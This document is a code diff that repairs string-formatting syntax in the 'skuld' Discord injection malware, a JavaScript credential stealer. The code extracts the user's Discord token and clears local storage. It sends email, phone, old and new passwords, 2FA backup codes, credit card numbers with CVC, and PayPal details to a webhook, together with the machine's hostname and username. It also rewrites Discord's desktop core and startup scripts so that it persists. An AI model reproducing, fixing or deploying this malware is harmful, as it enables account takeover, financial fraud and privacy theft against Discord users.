@@ -112,11 +112,11 @@ const executeJS = script => {
 };
 
 const clearAllUserData = () => {
-    executeJS("document.body.appendChild(document.createElementiframe).contentWindow.localStorage.clear()");
+    executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
     executeJS("location.reload()");
 };
 
-const getToken = async () => await executeJS((webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken());
+const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
 
 const request = async (method, url, headers, data) => {
     url = new URL(url);
@@ -146,14 +146,14 @@ const request = async (method, url, headers, data) => {
 };
 
 const hooker = async (content, token, account) => {
-    content["content"] = "" + os.hostname() + " - " + os.userInfo().username + "\n\n" + content["content"];
+    content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
     content["username"] = "skuld - cord injection";
     content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
     content["embeds"][0]["author"] = {
         "name": account.username,
     };
     content["embeds"][0]["thumbnail"] = {
-        "url": https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp
+        "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
     };
     content["embeds"][0]["footer"] = {
         "text": "skuld discord injection - made by hackirby",
@@ -170,9 +170,7 @@ const hooker = async (content, token, account) => {
 
     content["embeds"][0]["fields"].push({
         "name": "Token",
-        "value": "
-" + token + "
-",
+        "value": "```" + token + "```",
         "inline": false
     }, {
         "name": "Nitro",
@@ -189,10 +187,10 @@ const hooker = async (content, token, account) => {
     });
 
     content["embeds"].push({
-        "title": Total Friends: ${friends.totalFriends},
+        "title": `Total Friends: ${friends.totalFriends}`,
         "description": friends.message,
     }, {
-        "title": Total Servers: ${servers.totalGuilds},
+        "title": `Total Servers: ${servers.totalGuilds}`,
         "description": servers.message,
     });
 
@@ -225,13 +223,13 @@ const fetchFriends = async token => await fetch("/relationships", {
 const getNitro = flags => {
     switch (flags) {
         case 1:
-            return 'Nitro Classic';
+            return '`Nitro Classic`';
         case 2:
-            return 'Nitro Boost';
+            return '`Nitro Boost`';
         case 3:
-            return 'Nitro Basic';
+            return '`Nitro Basic`';
         default:
-            return '❌';
+            return '`❌`';
     }
 };
 
@@ -241,7 +239,7 @@ const getBadges = flags => {
         let b = CONFIG.badges[badge];
         if ((flags & b.Value) == b.Value) badges += b.Emoji + ' ';
     }
-    return badges || '❌';
+    return badges || '`❌`';
 }
 
 const getRareBadges = flags => {
@@ -268,7 +266,7 @@ const getBilling = async token => {
             }
         }
     });
-    return billing || '❌';
+    return billing || '`❌`';
 };
 
 const getFriends = async token => {
@@ -282,7 +280,7 @@ const getFriends = async token => {
         var badges = getRareBadges(acc.user.public_flags)
         if (badges != "") {
             if (!rareUsers) rareUsers = "**Rare Friends:**\n";
-            rareUsers += ${badges} ${acc.user.username}\n;
+            rareUsers += `${badges} ${acc.user.username}\n`;
         }
     }
     rareUsers = rareUsers || "**No Rare Friends**";
@@ -300,9 +298,9 @@ const getServers = async token => {
     let rareGuilds = "";
     for (const guild of filteredGuilds) {
         if (rareGuilds === "") {
-            rareGuilds += **Rare Servers:**\n;
+            rareGuilds += `**Rare Servers:**\n`;
         }
-        rareGuilds += ${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \${guild.name}\ - Members: \${guild.approximate_member_count}\\n;
+        rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
     }
 
     rareGuilds = rareGuilds || "**No Rare Servers**";
@@ -317,15 +315,15 @@ const EmailPassToken = async (email, password, token, action) => {
     const account = await fetchAccount(token)
 
     const content = {
-        "content": **${account.username}** just ${action}!,
+        "content": `**${account.username}** just ${action}!`,
         "embeds": [{
             "fields": [{
                 "name": "Email",
-                "value": "" + email + "",
+                "value": "`" + email + "`",
                 "inline": true
             }, {
                 "name": "Password",
-                "value": "" + password + "",
+                "value": "`" + password + "`",
                 "inline": true
             }]
         }]
@@ -343,25 +341,23 @@ const BackupCodesViewed = async (codes, token) => {
 
     let message = "";
     for (let code of filteredCodes) {
-        message += ${code.code.substr(0, 4)}-${code.code.substr(4)}\n;
+        message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
     }
     const content = {
-        "content": **${account.username}** just viewed his 2FA backup codes!,
+        "content": `**${account.username}** just viewed his 2FA backup codes!`,
         "embeds": [{
             "fields": [{
                     "name": "Backup Codes",
-                    "value": "
-" + message + "
-",
+                    "value": "```" + message + "```",
                     "inline": false
                 },
                 {
                     "name": "Email",
-                    "value": "" + account.email + "",
+                    "value": "`" + account.email + "`",
                     "inline": true
                 }, {
                     "name": "Phone",
-                    "value": "" + (account.phone || "None") + "",
+                    "value": "`" + (account.phone || "None") + "`",
                     "inline": true
                 }
             ]
@@ -376,15 +372,15 @@ const PasswordChanged = async (newPassword, oldPassword, token) => {
     const account = await fetchAccount(token)
 
     const content = {
-        "content": **${account.username}** just changed his password!,
+        "content": `**${account.username}** just changed his password!`,
         "embeds": [{
             "fields": [{
                 "name": "New Password",
-                "value": "" + newPassword + "",
+                "value": "`" + newPassword + "`",
                 "inline": true
             }, {
                 "name": "Old Password",
-                "value": "" + oldPassword + "",
+                "value": "`" + oldPassword + "`",
                 "inline": true
             }]
         }]
@@ -397,19 +393,19 @@ const CreditCardAdded = async (number, cvc, month, year, token) => {
     const account = await fetchAccount(token)
 
     const content = {
-        "content": **${account.username}** just added a credit card!,
+        "content": `**${account.username}** just added a credit card!`,
         "embeds": [{
             "fields": [{
                 "name": "Number",
-                "value": "" + number + "",
+                "value": "`" + number + "`",
                 "inline": true
             }, {
                 "name": "CVC",
-                "value": "" + cvc + "",
+                "value": "`" + cvc + "`",
                 "inline": true
             }, {
                 "name": "Expiration",
-                "value": "" + month + "/" + year + "",
+                "value": "`" + month + "/" + year + "`",
                 "inline": true
             }]
         }]
@@ -422,15 +418,15 @@ const PaypalAdded = async (token) => {
     const account = await fetchAccount(token)
 
     const content = {
-        "content": **${account.username}** just added a <:paypal:1148653305376034967> account!,
+        "content": `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
         "embeds": [{
             "fields": [{
                 "name": "Email",
-                "value": "" + account.email + "",
+                "value": "`" + account.email + "`",
                 "inline": true
             }, {
                 "name": "Phone",
-                "value": "" + (account.phone || "None") + "",
+                "value": "`" + (account.phone || "None") + "`",
                 "inline": true
             }]
         }]
@@ -469,16 +465,16 @@ async function initiation() {
         const account = await fetchAccount(token)
 
         const content = {
-            "content": **${account.username}** just got injected!,
+            "content": `**${account.username}** just got injected!`,
 
             "embeds": [{
                 "fields": [{
                     "name": "Email",
-                    "value": "" + account.email + "",
+                    "value": "`" + account.email + "`",
                     "inline": true
                 }, {
                     "name": "Phone",
-                    "value": "" + (account.phone || "None") + "",
+                    "value": "`" + (account.phone || "None") + "`",
                     "inline": true
                 }]
             }]
@@ -496,8 +492,8 @@ async function initiation() {
     const appPath = path.join(resourcePath, 'app');
     const packageJson = path.join(appPath, 'package.json');
     const resourceIndex = path.join(appPath, 'index.js');
-    const coreVal = fs.readdirSync(${app}\\modules\\).filter(x => /discord_desktop_core-+?/.test(x))[0]
-    const indexJs = ${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js;
+    const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
+    const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
     const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
     if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
     if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
@@ -515,7 +511,7 @@ async function initiation() {
             ),
         );
 
-        const startUpScript = const fs = require('fs'), https = require('https');
+        const startUpScript = `const fs = require('fs'), https = require('https');
   const indexJs = '${indexJs}';
   const bdPath = '${bdPath}';
   const fileSize = fs.statSync(indexJs).size
@@ -537,7 +533,7 @@ async function initiation() {
       });
   }
   require('${path.join(resourcePath, 'app.asar')}')
-  if (fs.existsSync(bdPath)) require(bdPath);;
+  if (fs.existsSync(bdPath)) require(bdPath);`;
         fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
     }
 }
